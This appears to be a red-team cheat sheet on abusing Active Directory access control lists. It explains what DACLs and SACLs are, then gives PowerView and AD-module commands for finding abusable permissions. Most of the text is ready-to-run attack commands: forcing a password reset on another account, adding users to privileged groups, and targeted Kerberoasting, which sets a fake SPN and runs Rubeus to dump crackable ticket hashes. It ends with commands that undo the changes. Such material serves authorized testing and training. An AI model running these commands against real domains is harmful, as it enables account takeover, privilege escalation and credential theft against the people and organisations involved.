# Access Control List (ACL) Abuse

Access Control Lists (ACLs) define who has access to an asset/resource and the 
level of access they are granted. The specific settings within an ACL are known 
as Access Control Entries (ACEs). Each ACE maps to a security principal (user, 
group, or process) and specifies the rights granted. Every object in Active 
Directory (AD) has an ACL, which can contain multiple ACEs because multiple 
security principals can access AD objects. ACLs can also be used for auditing
access within AD.

## Types of ACLs

1. **Discretionary Access Control List (DACL)**: Defines which security principals are granted or
 denied access to an object. DACLs consist of ACEs that allow or deny access. If a DACL does not 
 exist for an object, all users are granted full rights. If a DACL exists but has no ACE entries, 
 access is denied to all.

2. **System Access Control List (SACL)**: Allows administrators to log access attempts to secured 
objects.

## Enumeration

### Using PowerView

```shell
# Import PowerView module
Import-Module .\PowerView.ps1
# Find interesting ACLs (may produce large output)
Find-InterestingDomainAcl
# Get objects a user has rights over
$sid = Convert-NameToSid <username>
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}
# Get group information
Get-DomainGroup -Identity "<group_name>" | Select-Object memberof
# Get detailed group ACLs
$itgroupsid = Convert-NameToSid "<group_name>"
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $itgroupsid} -Verbose
```

### Using AD Module

```shell
# Create a list of domain users
Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt

# Get ACL information for each user
foreach($line in [System.IO.File]::ReadLines("<path_to_users_file>")) {
    get-acl "AD:\$(Get-ADUser $line)" |
    Select-Object Path -ExpandProperty Access |
    Where-Object {$_.IdentityReference -match '<domain\\username>'}
}
```

- BloodHound can also be used for ACL enumeration.

## Abusing ACLs

### Required Rights for Abuse

### 1. Changing a User's Password
Requires `Reset Password` permission.

```shell
# Authenticate as a user (optional if already running in the user's context)
$SecPassword = ConvertTo-SecureString '<password>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('<domain\\username>', $SecPassword)

# Change the user's password
Import-Module .\PowerView.ps1
$Password = ConvertTo-SecureString '<password>' -AsPlainText -Force
Set-DomainUserPassword -Identity <username> -AccountPassword $Password -Credential $Cred -Verbose
```

### 2. Adding a User to a Group
Requires `Write Member` or `Add Member` permission on the target group.

```shell
# List group members
Get-ADGroup -Identity "<group_name>" -Properties * | Select-Object -ExpandProperty Members

# Add a member to the group
Add-DomainGroupMember -Identity '<group_name>' -Members '<username>' -Credential <creds_of_user_with_permission> -Verbose
```

### 3. Targeted Kerberoasting
Requires `Write Property` or `GenericAll` permission to set a fake SPN.
```shell
# Create a fake SPN
Set-DomainObject -Credential <creds_of_user_with_permission> -Identity username1 -Set @{serviceprincipalname='notahacker/LEGIT'} -Verbose

# Perform Kerberoasting using Rubeus
.\Rubeus.exe kerberoast /user:username1 /nowrap
```

## Reversing the Changes

```shell
# Remove the fake SPN from the account
Set-DomainObject -Credential <creds_of_user_with_permission> -Identity username1 -Clear serviceprincipalname -Verbose

# Remove the user from the group
Remove-DomainGroupMember -Identity "<group_name>" -Members 'user' -Credential <creds_of_user_with_permission> -Verbose
```